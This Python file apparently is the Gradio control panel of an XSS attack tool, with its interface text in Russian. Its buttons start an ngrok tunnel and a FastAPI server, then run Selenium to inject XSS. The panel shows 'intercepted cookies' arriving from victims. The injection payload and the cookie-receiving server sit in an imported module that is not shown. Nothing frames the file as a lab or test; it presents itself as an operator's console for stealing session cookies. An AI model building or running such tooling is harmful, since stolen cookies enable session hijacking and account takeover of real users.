import gradio as gr
import time
import threading


from main import (
    start_ngrok_sync,
    shutdown_ngrok_sync,
    start_server_thread,
    run_complete_logic,
    stop_all,
    get_processed_data,
    
)




current_driver = None
ngrok_url_global = "Not started"
status_log = ["Интерфейс готов."]
is_running = False
update_thread = None
stop_update_event = threading.Event()


def update_status(new_log):
    """Добавляет сообщение в лог статуса."""
    status_log.append(f"[{time.strftime('%H:%M:%S')}] {new_log}")
    
    if len(status_log) > 100:
        status_log.pop(0)
    return "\n".join(status_log)


def update_cookie_display_periodically(update_interval=5):
    """Поток для периодического обновления отображения куки."""
    global is_running
    while is_running and not stop_update_event.is_set():
        
        
        
        
        
        time.sleep(update_interval)


def start_process():
    """Запускает весь процесс: ngrok, сервер, Selenium."""
    global current_driver, ngrok_url_global, is_running, status_log, update_thread, stop_update_event

    if is_running:
        return (
            ngrok_url_global,
            update_status("Процесс уже запущен."),
            get_processed_data(),
        )

    status_log = ["Запуск процесса..."]  
    is_running = True
    stop_update_event.clear()
    current_driver = None  

    yield ngrok_url_global, update_status(
        "Запуск ngrok..."
    ), "Загрузка..."  

    
    ngrok_url_global = start_ngrok_sync()
    yield ngrok_url_global, update_status(
        f"Ngrok URL: {ngrok_url_global}"
    ), "Загрузка..."
    if ngrok_url_global.startswith("Error"):
        is_running = False
        yield ngrok_url_global, update_status(
            "Ошибка запуска ngrok. Процесс остановлен."
        ), "Ошибка"
        return

    
    start_server_thread()
    yield ngrok_url_global, update_status(
        "FastAPI сервер запущен в фоновом режиме."
    ), "Загрузка..."

    
    yield ngrok_url_global, update_status(
        "Запуск Selenium и инъекции XSS..."
    ), "Загрузка..."
    driver_instance, selenium_message = run_complete_logic()
    current_driver = driver_instance  
    yield ngrok_url_global, update_status(
        selenium_message
    ), get_processed_data()  

    if not current_driver:
        is_running = False
        yield ngrok_url_global, update_status(
            "Ошибка в Selenium. Процесс остановлен."
        ), "Ошибка"
        
        stop_all(current_driver)
        return

    yield ngrok_url_global, update_status(
        "Процесс запущен. Ожидание входящих cookie..."
    ), get_processed_data()

    
    
    
    while is_running and not stop_update_event.is_set():
        yield ngrok_url_global, "\n".join(status_log), get_processed_data()
        time.sleep(5)  

    
    yield ngrok_url_global, update_status("Процесс остановлен."), get_processed_data()


def stop_process():
    """Останавливает все запущенные компоненты."""
    global current_driver, is_running, ngrok_url_global, status_log, stop_update_event

    if not is_running:
        return (
            ngrok_url_global,
            update_status("Процесс не был запущен."),
            get_processed_data(),
        )

    stop_update_event.set()  
    is_running = False
    status_message = stop_all(current_driver)
    current_driver = None
    ngrok_url_global = "Not started"

    return ngrok_url_global, update_status(status_message), get_processed_data()



with gr.Blocks(title="XSS Control Panel") as demo:
    gr.Markdown("# Панель Управления XSS Атакой")
    gr.Markdown(
        "Нажмите 'Запустить' для старта ngrok, веб-сервера и Selenium для инъекции XSS. Нажмите 'Остановить' для завершения всех процессов."
    )

    with gr.Row():
        start_button = gr.Button("Запустить", variant="primary")
        stop_button = gr.Button("Остановить")

    with gr.Row():
        ngrok_output = gr.Textbox(
            label="Ngrok URL", value=ngrok_url_global, interactive=False
        )

    with gr.Row():
        status_output = gr.Textbox(label="Статус / Логи", lines=10, interactive=False)

    with gr.Row():
        cookies_output = gr.Textbox(
            label="Перехваченные Cookies (обновляется периодически)",
            lines=10,
            interactive=False,
        )  

    
    
    
    
    start_button.click(
        fn=start_process,
        inputs=[],
        outputs=[ngrok_output, status_output, cookies_output],
    )

    stop_button.click(
        fn=stop_process,
        inputs=[],
        outputs=[ngrok_output, status_output, cookies_output],
    )


if __name__ == "__main__":
    print("Запуск Gradio интерфейса...")
    
    demo.launch(server_name="localhost")  
